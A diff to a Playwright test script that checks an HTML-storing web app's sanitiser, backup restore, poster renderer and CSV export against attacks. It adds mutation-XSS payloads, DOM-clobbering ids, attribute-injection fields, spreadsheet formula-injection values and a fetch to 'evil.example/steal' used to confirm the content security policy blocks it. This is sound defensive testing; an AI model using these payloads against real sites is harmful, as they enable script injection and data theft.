@@ -94,17 +94,26 @@ with sync_playwright() as p:
           '<p><a href="javascript&colon;window.__pwn++">c</a></p>',
           '<p>o</p><object data="javascript:window.__pwn++"></object>',
           '<p><svg><a xlink:href="javascript:window.__pwn++"><text>z</text></a></svg></p>',
-          '<p>f</p><form action="javascript:window.__pwn++"><button>go</button></form>']
+          '<p>f</p><form action="javascript:window.__pwn++"><button>go</button></form>',
+          # second review: mutation tricks
+          '<p>x</p><noscript><p title="</noscript><img src=x onerror=window.__pwn++>"></p></noscript>',
+          '<noembed><img title="</noembed><img src=x onerror=window.__pwn++>"></noembed>',
+          '<xmp><img title="</xmp><img src=x onerror=window.__pwn++>"></xmp>',
+          '<math><mtext><table><mglyph><style><img src=x onerror=window.__pwn++></style></mglyph></table></mtext></math>',
+          '<form><math><mtext></form><form><mglyph><style></math><img src onerror=window.__pwn++>',
+          '<template><img src=x onerror=window.__pwn++></template><p>t</p>',
+          '<details open ontoggle=window.__pwn++><summary>s</summary></details>',
+          '<p><img srcset="javascript:window.__pwn++ 1x"></p>']
     out=J("a=>a.map(safeStoredHTML)",evil)
     for e,o in zip(evil,out):
         lo=o.lower()
-        ok(not re.search(r'[\s/"\']on[a-z]+=|javascript|<script|<iframe|<object|<form|<animate|srcdoc',lo),'cleaned: '+e[:46]+' -> '+o[:60])
-    good='<h2>Method</h2><p>We had <b>120</b> students &amp; <i>two</i> groups.</p><table><tr><td>M</td><td>3.4</td></tr></table><img src="appuimg:abc">'
+        ok(not re.search(r'[\s/"\']on[a-z]+=|javascript|<script|<iframe|<object|<form|<animate|srcdoc|<noscript|<noembed|<xmp|<math|<template',lo) or ('&lt;' in lo and '<img' not in lo),'cleaned: '+e[:46]+' -> '+o[:60])
+    good='<h2>Method</h2><p>We had <b>120</b> students &amp; <i>two</i> groups.</p><table><tbody><tr><td>M</td><td>3.4</td></tr></tbody></table><img src="appuimg:abc">'
     ok(J("h=>safeStoredHTML(h)===h",good),'a clean body comes back exactly as it was')
     # rendering through every path does not run code
     J("""a=>{const box=document.createElement('div');document.body.appendChild(box);a.forEach(h=>{const d=document.createElement('div');d.innerHTML=bodyToHTML(h);box.appendChild(d)});}""",evil)
     pg.wait_for_timeout(600)
-    ok(J("window.__pwn")==0,'showing all eleven bodies on the page ran nothing')
+    ok(J("window.__pwn")==0,'showing every hostile body on the page ran nothing')
     # backup file restore path
     bk=json.dumps([{'id':'d1','title':'x','body':evil[0]},{'id':'d2','title':'y','body':evil[1]}])
     info=J("j=>{window.__pwn=0;const i=backupDocsInfo({appu_docs:j});return i}",bk)
@@ -116,12 +125,39 @@ with sync_playwright() as p:
     ok(J("()=>{try{backupCleanDocs('{\"a\":1}');return false}catch(e){return true}}"),'a backup whose document list is not a list is refused')
     J("h=>{window.__pwn=0;setEditorHTML(h)}",evil[0]); pg.wait_for_timeout(600)
     ok(J("window.__pwn")==0 and 'onerror' not in J("editor.innerHTML"),'opening a hostile body in the editor runs nothing')
+
+    # the cleaner's output is stable: cleaning it again changes nothing
+    ok(J("a=>a.every(h=>{const o=safeStoredHTML(h);return safeStoredHTML(o)===o})",evil+[good]),'cleaning is stable (a second pass changes nothing)')
+    # DOM clobbering: stored ids and names never reach the page
+    J("()=>{window.__pwn=0;setEditorHTML('<p>a</p><a id=\"_bkRestoring\"></a><img name=\"_statsData\"><form id=x><input name=y></form>')}")
+    ok(J("()=>!(window._bkRestoring===true)&&!(window._bkRestoring instanceof Element)&&!(window._statsData instanceof Element)"),'an id in a stored body cannot switch off saving or overwrite app state')
+    ok(J("()=>!editor.querySelector('[id],[name]')"),'ids and names are dropped from stored bodies')
+    imp=J("h=>ijCleanImportHTML(h)",'<p id="_bkRestoring">x</p><a name="_tg">y</a>')
+    ok('id=' not in imp and 'name=' not in imp,'imported pages lose ids and names too: '+imp)
+    # inert parsing for counting and reading text
+    J("()=>{window.__pwn=0;extractStudentText('<img src=x onerror=window.__pwn++>');qualUnwrapSpansInHTML('<img src=x onerror=window.__pwn++>',[]);clHtmlToText('<img src=x onerror=window.__pwn++>');htmlPlainText('<img src=x onerror=window.__pwn++>')}")
+    pg.wait_for_timeout(500)
+    ok(J("window.__pwn")==0,'reading text out of a hostile body runs nothing')
+    # poster boxes from a backup
+    J("""()=>{window.__pwn=0;const root=document.createElement('div');document.body.appendChild(root);
+        pzRender(root,{size:'A0P',theme:'purple',title:'T',people:[],affs:[],cols:'2);x:expression(1',logos:['x" onerror="window.__pwn++','data:image/svg+xml;base64,PHN2Zz4='],
+          boxes:[{id:'b1" onmouseover="window.__pwn++',t:'Intro',col:0,h:'<img src=x onerror=window.__pwn++>',img:'x" onerror="window.__pwn++',iw:'90%;x'}]},false);
+        window.__pz=root.innerHTML;window.__pzOn=[...root.querySelectorAll('*')].some(e=>[...e.attributes].some(a=>/^on/i.test(a.name)))}""")
+    pg.wait_for_timeout(600)
+    pz=J("window.__pz")
+    ok(J("window.__pwn")==0 and not J("window.__pzOn") and 'svg+xml' not in pz and 'pz-img' not in pz,'a hostile poster from a backup runs nothing')
+    ok(J("()=>pzImgSrc('data:image/png;base64,iVBORw0KGgo=')")=='data:image/png;base64,iVBORw0KGgo=' and J("()=>pzImgSrc('appuimg:abc123')")=='appuimg:abc123','real poster pictures still show')
+    # links from OpenAlex keep to http(s)
+    ok("url=/^https?:\\/\\//i.test(String(url0||'').trim())" in H,'the free-copy link must be http(s)')
     # ---- 3. CSV
     r=J("""()=>[qnCsvCell('=HYPERLINK("http://x","y")'),qnCsvCell('+cmd'),qnCsvCell('@SUM(A1)'),qnCsvCell('-3'),qnCsvCell('+2.5'),qnCsvCell('-1e3'),qnCsvCell('-ve mood'),qnCsvCell('\\t=1'),qnCsvCell('hello'),pdCsvCell('=1+1'),pdCsvCell('-7')]""")
     ok(r[0].startswith('"\'=') and r[1]=="'+cmd" and r[2]=="'@SUM(A1)",'formula cells get an apostrophe '+str(r[:3]))
     ok(r[3]=='-3' and r[4]=='+2.5' and r[5]=='-1e3','plain numbers are untouched '+str(r[3:6]))
     ok(r[6]=="'-ve mood" and r[7].startswith("'\t") and r[8]=='hello','text starting with - or tab is guarded, ordinary text untouched')
     ok(r[9]=="'=1+1" and r[10]=='-7','de-identification CSV is guarded too')
+    r2=J("()=>[' =1+1','\\uff1d1+1','\\u200b=1','\\n=1','|cmd',' -3'].map(csvNoFormula)")
+    ok(all(x.startswith("'") for x in r2[:5]),'leading space, full-width =, zero-width space, newline and | are guarded '+str(r2))
+    ok(r2[5]==" -3" or r2[5]=="' -3",'a spaced number is handled ('+r2[5]+')')
     # ---- 4c. the policy is live: a call to an unlisted host is refused by the browser itself
     v=J("""()=>new Promise(res=>{let hit=null;document.addEventListener('securitypolicyviolation',e=>{if(/evil\\.example/.test(e.blockedURI))hit=e.violatedDirective},{once:false});
         fetch('https://evil.example/steal').catch(()=>{}).finally(()=>setTimeout(()=>res(hit),300))})""")
@@ -135,5 +171,7 @@ with sync_playwright() as p:
     pk=b.new_page(); pk.goto('http://localhost:8765/kit.html'); pk.wait_for_timeout(800)
     k=pk.evaluate("()=>[csvCell('=2+5'),csvCell('-4'),csvCell('fine'),csvCell('@x')]")
     ok(k==['"\'=2+5"','"-4"','"fine"','"\'@x"'],'kit CSV: formulas guarded, numbers kept '+str(k))
+    k2=pk.evaluate("()=>[csvCell(' =1'),csvCell('\\uff1d1')]")
+    ok(all(x.startswith('"\'') for x in k2),'kit CSV: spaced and full-width formulas guarded '+str(k2))
     b.close()
 print('\n%d failed'%len(fails)); sys.exit(1 if fails else 0)
